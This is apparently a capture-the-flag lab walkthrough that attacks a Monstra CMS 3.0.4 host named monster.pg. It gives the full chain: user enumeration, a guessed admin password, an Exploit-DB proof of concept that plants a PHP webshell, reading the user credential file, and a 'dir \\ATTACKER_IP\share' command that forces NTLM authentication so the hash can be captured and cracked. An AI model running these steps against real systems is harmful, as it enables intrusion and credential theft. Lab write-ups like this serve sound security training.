# Monstra CMS

Monstra CMS `3.0.4` can expose user enumeration and authenticated RCE paths. On Windows/XAMPP targets, successful RCE may execute as the local web user rather than a low-privileged service account.

## Discovery

Useful indicators:

```text
80/tcp open  http  Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
|_http-title: Mike Wazowski
```

Nmap HTTP enum may reveal a blog path:

```text
http-enum:
  /blog/: Blog
```

Add the discovered virtual host before browsing:

```text
TARGET monster.pg
```

Monstra indicators:

```text
http://monster.pg/blog/
Welcome to your new Monstra powered website.

http://monster.pg/blog/admin/
(c) 2012 - 2016 Monstra - Version 3.0.4
```

Nuclei may also identify it:

```text
[metatag-cms] Powered by Monstra 3.0.4
[monstracms-detect] 3.0.4
[monstra-admin-panel] /blog/admin/index.php
```

## User Enumeration

Monstra user pages may be public:

```text
http://monster.pg/blog/users
http://monster.pg/blog/users/1
```

Observed users:

```text
admin
mike
```

Useful profile details:

```text
Username: admin
Email: wazowski@monster.pg

Username: mike
Email: mike@monster.pg
```

Build a small target-specific wordlist from the main site and blog:

```bash
cewl -w list.txt -d 5 -m 4 http://monster.pg
grep wazowski list.txt
```

Working credential:

```text
admin:wazowski
```

## Authenticated RCE

References:

```text
https://www.exploit-db.com/exploits/52038
https://www.exploit-db.com/exploits/49949
https://www.exploit-db.com/exploits/48479
https://github.com/advisories/GHSA-gvcr-c452-fm6g
```

Run the working Exploit-DB `52038` PoC:

```bash
python3 exploit.py http://monster.pg/blog/ admin wazowski
```

Successful output:

```text
Logging in...
Login successful
Preparing shell...
Your shell is ready: http://monster.pg/blog//public/themes/default/l13zp.chunk.php
```

Use the webshell:

```text
http://monster.pg/blog//public/themes/default/l13zp.chunk.php?cmd=whoami
```

Successful execution context:

```text
mike-pc\mike
```

## Credential Files

The Monstra user database is stored under the web root:

```cmd
type C:\xampp\htdocs\blog\storage\database\users.table.xml
```

Useful fields include `login`, `password`, `email`, `role`, and `hash`.

## Post-Exploitation

From the Monstra command shell, force the current Windows user to authenticate to an attacker SMB listener:

```cmd
dir \\ATTACKER_IP\share
```

Crack the captured NetNTLMv2 hash with Hashcat mode `5600`. In the observed path, the cracked credential was:

```text
mike:Mike14
```

Use the credential for RDP access, then continue local Windows privilege escalation from an interactive session.
